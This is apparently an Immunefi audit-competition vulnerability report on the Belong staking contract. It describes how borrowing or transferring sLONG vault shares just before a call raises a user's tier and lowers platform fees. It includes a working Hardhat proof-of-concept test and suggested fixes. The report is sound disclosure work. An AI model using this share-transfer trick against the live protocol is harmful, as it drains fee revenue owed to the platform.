# 57884 sc low staking tier manipulation via erc4626 shares slong&#x20;

**Submitted on Oct 29th 2025 at 11:21:47 UTC by @jo13 for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57884
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/BelongCheckIn.sol>
* **Impacts:** Theft of unclaimed yield

## Description

### Brief / Intro

Tiers are determined using the staking vault’s ERC20 share balance (`sLONG`) via `staking.balanceOf(addr)`, while tier thresholds are expressed in LONG assets (18 decimals). Because `sLONG` shares are freely transferable and their asset backing varies with the ERC4626 exchange rate, an attacker can temporarily inflate their share balance (for example, by borrowing or transferring in shares at call time) to qualify for a higher tier. This reduces platform fees or increases payouts, causing direct protocol revenue loss and unfair advantages in production.

### Vulnerability Details

* Tier lookups use share balance (not assets):

  ```solidity
  // contracts/v2/platform/BelongCheckIn.sol
  // Venue tier lookup
  VenueStakingRewardInfo memory stakingInfo = stakingRewards[
      _storage.contracts.staking.balanceOf(venueInfo.venue).stakingTiers()
  ].venueStakingInfo;

  // Promoter tier lookup
  PromoterStakingRewardInfo memory stakingInfo = stakingRewards[
      _storage.contracts.staking
          .balanceOf(promoterInfo.promoter)
          .stakingTiers()
  ].promoterStakingInfo;
  ```
* Tier thresholds expect LONG asset amounts (18 decimals):

  ```solidity
  // contracts/v2/utils/Helper.sol
  /// @notice Resolves the staking tier based on the staked amount of LONG (18 decimals).
  function stakingTiers(uint256 amountStaked) external pure returns (StakingTiers tier) {
      if (amountStaked < 50000e18) {
          return StakingTiers.NoStakes;
      } else if (amountStaked >= 50000e18 && amountStaked < 250000e18) {
          return StakingTiers.BronzeTier;
      } else if (amountStaked >= 250000e18 && amountStaked < 500000e18) {
          return StakingTiers.SilverTier;
      } else if (amountStaked >= 500000e18 && amountStaked < 1000000e18) {
          return StakingTiers.GoldTier;
      }
      return StakingTiers.PlatinumTier;
  }
  ```
* ERC4626 shares vs assets distinction (shares are transferable):

  ```solidity
  // contracts/v2/periphery/Staking.sol
  contract Staking is Initializable, ERC4626, Ownable {
      // Deposit mints shares; share-based bookkeeping
      function _deposit(address by, address to, uint256 assets, uint256 shares) internal override {
          super._deposit(by, to, assets, shares);
          stakes[to].push(Stake({shares: shares, timestamp: block.timestamp}));
      }

      // Clear separation of assets and shares
      function emergencyWithdraw(uint256 assets, address to, address _owner) external returns (uint256 shares) {
          if (assets > maxWithdraw(_owner)) revert WithdrawMoreThanMax();
          shares = previewWithdraw(assets);   // convert assets -> shares
          _emergencyWithdraw(msg.sender, to, _owner, assets, shares);
      }
  }
  ```

  * `balanceOf(address)` returns the sLONG share balance (ERC20), not LONG assets.
  * Shares are freely transferable and their asset backing changes with reward distributions (exchange-rate effect).
* Where tiers impact economics:
  * Venue deposit fees:

    ```solidity
    // contracts/v2/platform/BelongCheckIn.sol
    uint256 platformFee = stakingInfo.depositFeePercentage.calculateRate(venueInfo.amount);
    ```
  * Promoter settlement fees:

    ```solidity
    // contracts/v2/platform/BelongCheckIn.sol
    uint24 percentage = promoterInfo.paymentInUSDC
        ? stakingInfo.usdcPercentage
        : stakingInfo.longPercentage;
    uint256 platformFees = percentage.calculateRate(toPromoter);
    ```
* Exploitable patterns (how manipulation works):
  * Share-transfer spoof: Move/borrow sLONG shares into the address just-in-time, call the fee-sensitive function (`venueDeposit` / `distributePromoterPayments`), then move them back.
  * Exchange-rate gaming: Deposit before a large `distributeRewards()` to mint more shares per asset; since tiers read shares, user qualifies for higher tiers with fewer underlying LONG than intended.

## Impact Details

* Direct revenue loss
  * Venues can momentarily appear in higher tiers to reduce `depositFeePercentage` on large deposits.
  * Promoters can reduce `usdcPercentage/longPercentage` fees taken from their settlements by inflating tier at call time.
* Systemic unfairness
  * Tiers are meant to reflect sustained asset commitment; using transferable shares allows benefits without genuine or time-weighted stake.
* Severity mapping (Immunefi scope)
  * High – Theft of unclaimed yield/royalties (platform fee leakage across deposits/settlements).

## References

<details>

<summary>Referenced files and locations</summary>

* Tier lookups using shares:
  * `contracts/v2/platform/BelongCheckIn.sol` (venue and promoter tier lookups using `staking.balanceOf(...).stakingTiers()`).
* Tier thresholds expect assets:
  * `contracts/v2/utils/Helper.sol` → `stakingTiers(uint256 amountStaked)` with 18-decimal LONG thresholds.
* ERC4626 shares vs assets:
  * `contracts/v2/periphery/Staking.sol` (inherits ERC4626; `balanceOf` is shares; `previewWithdraw/convertToAssets` separate assets).
* Fee application points:
  * `contracts/v2/platform/BelongCheckIn.sol` → `depositFeePercentage.calculateRate(...)`, `usdcPercentage/longPercentage.calculateRate(...)`.

</details>

## Proof of Concept

The following test demonstrates manipulating the venue deposit fee by temporarily transferring sLONG shares to the venue address prior to calling `venueDeposit`, then returning them after the call.

Add this test to `/home/jo/audit-comp-belong/test/v2/platform/belong-check-in.test.ts` and run:

LEDGER\_ADDRESS=0x0000000000000000000000000000000000000001 PK=0x0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef npx hardhat test test/v2/platform/belong-check-in.test.ts --grep "Staking tier manipulation"

```js
 describe('Staking tier manipulation', () => {
    it('venue deposit fee reduced via temporary sLONG shares', async () => {
      const {
        belongCheckIn,
        staking,
        helper,
        admin,
        signer,
        USDC,
        ENA,
        USDC_whale,
        ENA_whale,
      } = await loadFixture(fixture);

      // Force platform fee on first deposit by setting free credits to 0
      const feesNew = { ...fees, referralCreditsAmount: 0 };
      await belongCheckIn.connect(admin).setParameters(paymentsInfo, feesNew, stakingRewards);

      const depositAmount = await u(100, USDC); // 100 USDC

      /* ---------- baseline: no stakes (10% fee) ---------- */
      const msgBase = ethers.utils.solidityKeccak256(
        ['address', 'bytes32', 'string', 'uint256'],
        [USDC_whale.address, ethers.constants.HashZero, 'baseline', chainId],
      );
      const sigBase = EthCrypto.sign(signer.privateKey, msgBase);
      const venueInfoBase: VenueInfoStruct = {
        rules: { paymentType: 1, bountyType: 1, longPaymentType: 0 } as VenueRulesStruct,
        venue: USDC_whale.address,
        amount: depositAmount,
        referralCode: ethers.constants.HashZero,
        uri: 'baseline',
        signature: sigBase,
      };

      const fee10 = await helper.calculateRate(1000, depositAmount); // 10%
      const totalBase = fee10.add(convenienceFeeAmount).add(depositAmount);
      await USDC.connect(USDC_whale).approve(belongCheckIn.address, totalBase);
      const balBaseBefore = await USDC.balanceOf(USDC_whale.address);
      await belongCheckIn.connect(USDC_whale).venueDeposit(venueInfoBase);
      const balBaseAfter = await USDC.balanceOf(USDC_whale.address);
      const spentBase = balBaseBefore.sub(balBaseAfter);

      /* ---------- manipulation: borrow 50k LONG shares ---------- */
      const stakeAssets = ethers.utils.parseEther('50000'); // 50,000 LONG assets
      await ENA.connect(ENA_whale).approve(staking.address, stakeAssets);
      await staking.connect(ENA_whale).deposit(stakeAssets, ENA_whale.address);
      const sharesBorrowed = await staking.balanceOf(ENA_whale.address);
      await staking.connect(ENA_whale).transfer(USDC_whale.address, sharesBorrowed);

      const msgManip = ethers.utils.solidityKeccak256(
        ['address', 'bytes32', 'string', 'uint256'],
        [USDC_whale.address, ethers.constants.HashZero, 'manipulated', chainId],
      );
      const sigManip = EthCrypto.sign(signer.privateKey, msgManip);
      const venueInfoManip: VenueInfoStruct = {
        rules: { paymentType: 1, bountyType: 1, longPaymentType: 0 } as VenueRulesStruct,
        venue: USDC_whale.address,
        amount: depositAmount,
        referralCode: ethers.constants.HashZero,
        uri: 'manipulated',
        signature: sigManip,
      };

      const fee9 = await helper.calculateRate(900, depositAmount); // 9%
      const totalManip = fee9.add(convenienceFeeAmount).add(depositAmount);
      await USDC.connect(USDC_whale).approve(belongCheckIn.address, totalManip);
      const balManipBefore = await USDC.balanceOf(USDC_whale.address);
      await belongCheckIn.connect(USDC_whale).venueDeposit(venueInfoManip);
      const balManipAfter = await USDC.balanceOf(USDC_whale.address);
      const spentManip = balManipBefore.sub(balManipAfter);

      console.log('USDC spent without stakes:', spentBase.toString());
      console.log('USDC spent with borrowed shares:', spentManip.toString());

      // Expect 10 USDC savings (100 vs 90 fee)
      expect(spentBase.sub(spentManip)).to.eq(fee10.sub(fee9));

      // Clean-up: return shares
      await staking.connect(USDC_whale).transfer(ENA_whale.address, sharesBorrowed);
    });
  });
```

## Recommended Fixes (not exhaustive)

* Use asset-equivalent balances when evaluating tiers. For ERC4626 vaults this means converting shares to assets using the vault’s conversion function (e.g., `convertToAssets(balanceOf(addr))` or `previewRedeem(balanceOf(addr))`) before passing to `stakingTiers(...)`.
* Alternatively, track time-weighted or non-transferable stake accounting (e.g., maintain internal staking records that reflect lockups or non-transferable positions) if tiers should represent committed stakes.
